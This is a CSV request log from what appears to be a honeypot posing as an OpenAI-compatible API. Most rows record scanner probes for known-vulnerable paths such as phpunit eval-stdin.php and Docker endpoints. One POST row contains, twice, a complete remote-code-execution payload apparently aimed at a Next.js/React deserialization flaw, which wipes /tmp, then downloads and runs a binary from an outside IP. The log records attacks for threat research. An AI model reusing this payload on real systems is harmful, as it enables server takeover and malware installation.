request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
7acad5cf-619b-4aae-9343-7cd416ba1722,2026-04-17T09:55:43.569673+00:00,anon_ef0ed959,GET,/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
caf9a01c-e53e-486a-ac9e-fc3229afca7f,2026-04-17T09:55:44.049189+00:00,anon_ef0ed959,GET,/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8010c695-33b9-48d5-848a-94a34dc71339,2026-04-17T09:55:44.525934+00:00,anon_ef0ed959,GET,/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a00803b8-4e8a-4967-a7b3-cbbe819b9450,2026-04-17T09:55:45.022944+00:00,anon_ef0ed959,GET,/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6cdeb727-8996-4c7c-b7e9-fda1d7c42bff,2026-04-17T09:55:45.503368+00:00,anon_ef0ed959,GET,/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ae20e2e1-5607-4f7a-b0c1-cba365fa156e,2026-04-17T09:55:46.105678+00:00,anon_ef0ed959,GET,/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a61aaf2c-0555-44d0-872b-770a59e76286,2026-04-17T09:55:46.671273+00:00,anon_ef0ed959,GET,/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cea7578b-8b69-4d9d-b6d4-9989cd5829a8,2026-04-17T09:55:47.131206+00:00,anon_ef0ed959,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
97eaf48a-5b0b-49da-a69c-9eea87271cf9,2026-04-17T09:55:47.586920+00:00,anon_ef0ed959,GET,/public/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
0244a4a2-625e-450e-82da-59ca4474c927,2026-04-17T09:55:48.157605+00:00,anon_ef0ed959,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7b16146f-384d-45c9-93a1-8efd58dc4652,2026-04-17T09:55:48.739509+00:00,anon_ef0ed959,GET,/index.php,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
36570180-8991-4f5b-ba3c-08df2401df50,2026-04-17T09:55:49.227982+00:00,anon_ef0ed959,GET,/containers/json,[honeypot-host],libredtail-http,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
afca2627-ee14-42ea-b6f8-bceab6a5b43b,2026-04-17T09:55:55.643481+00:00,anon_dbb28f29,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
122753f6-81f7-42ef-9c6d-e110f843bc3e,2026-04-17T09:59:19.212959+00:00,anon_2268a757,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
40c817ea-7381-4dfc-a9ec-2ae74f1fa746,2026-04-17T10:00:51.172885+00:00,anon_dbb28f29,GET,/geoserver/web/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
262fd0d3-3a36-4f7f-bb19-e854e78e786c,2026-04-17T10:02:39.206668+00:00,anon_facef30f,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
fd26c0ec-c22f-4f22-a818-4ddeee4aa24d,2026-04-17T10:07:32.851936+00:00,anon_5a9eae90,POST,/,[honeypot-host],Mozilla/5.0,,1567,316,1,,"------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
","------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""0""

""$1""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""1""

{""status"":""resolved_model"",""reason"":0,""_response"":""$5"",""value"":""{\""then\"":\""$4:map\"",\""0\"":{\""then\"":\""$B3\""},\""length\"":1}"",""then"":""$2:then""}
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""2""

""$@3""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""3""

""""
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""4""

[]
------WebKitFormBoundaryReactCVE
Content-Disposition: form-data; name=""5""

{""_bundlerConfig"":{},""_chunks"":""$2:_response:_chunks"",""_formData"":{""get"":""$4:constructor:constructor""},""_prefix"":""(function(){\n        try {\n            var res = process.mainModule.require(\""child_process\"").execSync(\""cd /tmp; pkill -9 morte; kill xd.x86; pkill -9 locker; killall -9 morte 2\u003e/dev/null; killall -9 locker 2\u003e/dev/null; rm -rf /tmp/* 2\u003e/dev/null; busybox wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /usr/bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /bin/wget http://94.156.152.67:83/manji.x86 -O manji.x86 || /sbin/wget http://94.156.152.67:83/manji.x86 -O manji.x86; chmod 777 manji.x86; ./manji.x86 nextjs\"").toString();\n            console.log(\""\\n[+] RCE RESULT:\\n\"" + res);\n            throw new Error(\""[+] RCE SUCCESS: \"" + res);\n        } catch(e) {\n            console.log(e);\n            throw e;\n        }\n    })()//""}
------WebKitFormBoundaryReactCVE--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
dea8259c-b863-4efe-a436-ad4003b9cdcb,2026-04-17T10:11:30.678629+00:00,anon_9f080693,GET,/,,,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
98ed1a47-df0c-40c7-b640-484ab4e0b4e1,2026-04-17T10:12:50.440858+00:00,anon_86dd6e81,GET,/,[honeypot-host],Go-http-client/1.1,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
9ae22b26-d67f-4ebc-ab8f-acb06d021f93,2026-04-17T11:11:37.308214+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
69cc7df4-e574-49dd-a80e-0b5387756e45,2026-04-17T11:30:44.997689+00:00,anon_4ffc8213,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
6f555e9a-374e-403f-888b-183c1ab50c05,2026-04-17T11:32:48.829176+00:00,anon_2a880913,GET,/,[honeypot-host],"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
a64a4370-23cd-4be5-adf7-0b6594483c29,2026-04-17T12:13:19.910598+00:00,anon_e4abd023,GET,/,,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e1241d34-a086-4f70-8bf9-5e7c13efc4d0,2026-04-17T12:48:56.681378+00:00,anon_c24a06f0,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
